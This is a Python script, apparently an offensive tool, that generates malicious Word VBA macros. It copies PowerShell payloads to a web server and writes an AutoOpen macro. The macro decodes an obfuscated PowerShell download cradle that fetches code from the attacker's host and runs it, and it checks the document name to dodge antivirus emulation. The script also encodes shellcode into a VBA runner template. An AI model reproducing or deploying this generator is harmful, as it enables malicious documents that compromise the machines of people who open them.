 #!/bin/python3
import subprocess
import socket
import random
import os
from colorama import init
from termcolor import colored

'''
VBA payload generator
'''

init()

def read_file(f):
        with open(f, 'r') as fs:
            content = fs.read()
        return content

def encodeString(payload):
    cipher_key = 17 
    output = ""

    for i in payload:
        ascii = int(ord(i))
        ascii = ascii + cipher_key
        str_ascii = str(ascii)
        if len(str_ascii) == 1:
            str_ascii = "00" + str_ascii
            output += str_ascii
        elif  len(str_ascii) == 2:
            str_ascii = "0" + str_ascii
            output += str_ascii
        elif len(str_ascii) == 3:
            output += str_ascii
    #print(f"Cipher key: {cipher_key}")
    #print(f"Encoded payload:\n    {output}")
    return output

def generateMacroPayloadWithPS(lhost, srv_port, arch):
    # function body
    print(colored("[+] Generating VBA exploit with PS download cradle", 'green'))

    # select the PS file
    # Getting the current work directory (cwd)
    out_dir = os.getcwd() + f"/output/{arch}"

    ps_files = []
    ps_filenames = []
    i = 1
    # r=root, d=directories, f = files
    for r, d, f in os.walk(out_dir):
        for file in f:
            if file.endswith(".ps1"):
                ps_files.append(file)
                #ps_files.append(os.path.join(r, file))

    if (len(ps_files) < 1):
        print(colored(f"    [!] No PS payloads found. Create PS payloads!", 'red'))
    

    for ps_file in ps_files:
        # copy ps to apache root dir
        print(colored(f"    [+] Copying {ps_file} to /var/www/html/expl-{arch}-{ps_file}"))
        os.system(f"cp {out_dir}/{ps_file} /var/www/html/expl-{arch}-{ps_file}")


        # file stored in Apache default directory and is accessible on port 80
        payload = f"powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://{lhost}:{srv_port}/expl-{arch}-{ps_file}'))"
            
        ### payload encryption
        
        encPayload1 = encodeString(payload)
        encPayload2 = encodeString("winmgmts:")
        encPayload3 = encodeString("Win32_Process")
        encDocName = encodeString("runner.doc")
        

        ### encrypted payload
        #print(colored("[+] Obfuscated VBA macro (copy and paste):", 'green'))
        
        vba = f"""
    'Decryption functions'
    Function Decipher(EncAsciiChar)
        Decipher = Chr(EncAsciiChar - 17)
    End Function

    Function GetFirstThreeCharacters(Encrypted_text)
        GetFirstThreeCharacters = Left(Encrypted_text, 3)
    End Function

    Function RemoveUsedThreeCharacters(Encrypted_text)
        RemoveUsedThreeCharacters= Right(Encrypted_text, Len(Encrypted_text) - 3)
    End Function

    Function DecryptText(Encryptedtext)
        Do
            DecryptedText = DecryptedText + Decipher(GetFirstThreeCharacters(Encryptedtext))
            Encryptedtext = RemoveUsedThreeCharacters(Encryptedtext)
        Loop While Len(Encryptedtext) > 0
        DecryptText = DecryptedText
    End Function

    'Main code'
    Function MyMacro()
        Dim EncStrArg As String
        Dim DecStrArg As String
            
        'Heuristic detection bypass - check name of document, most antivirus products rename the document during emulation. Break if emulated'
        'encrypted runner.doc file name'
        If ActiveDocument.Name <> DecryptText("{encDocName}") Then
            Exit Function
        End If

        EncStrArg = "{encPayload1}"

        DecStrArg = DecryptText(EncStrArg)
        GetObject(DecryptText("{encPayload2}")).Get(DecryptText("{encPayload3}")).Create DecStrArg, Null, Null, pid
    End Function
        
    Sub AutoOpen()
        MyMacro
    End Sub
        """

        

        # Write payloads
        f = open(f"output/{arch}/vba_with_{ps_file}.vba", 'w')
        f.write(vba)
        f.close()


def generateMacroPayload(shellcode, arch):

    print(colored("[+] Generating VBA exploit", 'green'))

    # encryption
    #print(shellcode)
    start = shellcode.find("(")
    end = shellcode.find(")")
    shellcode_start = shellcode[0:start].strip()
    shellcode = shellcode[start+1:end].strip()
    shellcode_chars = shellcode.split(",") 
    counter = 0
    for i in shellcode_chars:
        if (not i.isdigit()):
            #shellcode_chars[counter] = i.replace(" _\n", "")
            shellcode_chars[counter] = ''.join(filter(str.isdigit, i))
        counter = counter + 1

    shellcode_chars = list(filter(None, shellcode_chars))
    #print(shellcode_chars)

    encoded_shellcode_chars = []
    counter = 0
    for b in shellcode_chars:
        counter = counter + 1
        if (counter % 50 == 0):
            encoded_shellcode_chars.append(" _\n" + str((int(b)+2 & 0xFF)))
        else:
            encoded_shellcode_chars.append(str((int(b)+2 & 0xFF)))

    
    #print(encoded_shellcode_chars)
    encoded_shellcode = shellcode_start + "("+ ",".join(filter(None,encoded_shellcode_chars)) + ")"
    #print(encoded_shellcode)

    # VBA shellcode runner
    template_name = "vba.vba"
    template = read_file("templates/" + template_name)
    template_out = template.replace("%ENCSHELLCODE%", encoded_shellcode)
    
    f = open(f"output/{arch}/" + template_name, 'w')
    f.write(template_out)
    f.close()